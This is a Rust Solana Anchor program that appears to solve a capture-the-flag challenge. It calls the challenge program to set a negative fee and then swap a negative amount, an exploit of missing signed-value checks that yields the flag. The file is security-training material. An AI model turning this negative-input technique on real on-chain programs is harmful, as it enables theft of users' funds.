use anchor_lang::prelude::*;

use anchor_spl::token::Token;

declare_id!("osecio1111111111111111111111111111111111111");

#[program]
pub mod solve {
    use super::*;

    pub fn get_flag(_ctx: Context<GetFlag>) -> Result<()> {
        let fee_accs = chall::cpi::accounts::AuthFee{
            state: _ctx.accounts.state.to_account_info(),
            payer: _ctx.accounts.payer.to_account_info(),
            system_program: _ctx.accounts.system_program.to_account_info(),
            rent: _ctx.accounts.rent.to_account_info(),
        };

        let fee = CpiContext::new(_ctx.accounts.chall.to_account_info(), fee_accs);
        chall::cpi::set_fee(fee, -100)?;

        let swap_accs = chall::cpi::accounts::Swap{
            state: _ctx.accounts.state.to_account_info(),
            payer: _ctx.accounts.payer.to_account_info(),
            system_program: _ctx.accounts.system_program.to_account_info(),
            rent: _ctx.accounts.rent.to_account_info(),
        };

        let swap_cpi = CpiContext::new(_ctx.accounts.chall.to_account_info(), swap_accs);
        chall::cpi::swap(swap_cpi, -1_000_000)?;

        Ok(())
    }
}

#[derive(Accounts)]
pub struct GetFlag<'info> {
    #[account(mut)]
    pub state: AccountInfo<'info>,
    #[account(mut)]
    pub payer: Signer<'info>,

    pub system_program: Program<'info, System>,
    pub token_program: Program<'info, Token>,
    pub rent: Sysvar<'info, Rent>,
    pub chall: Program<'info, chall::program::Chall>
}
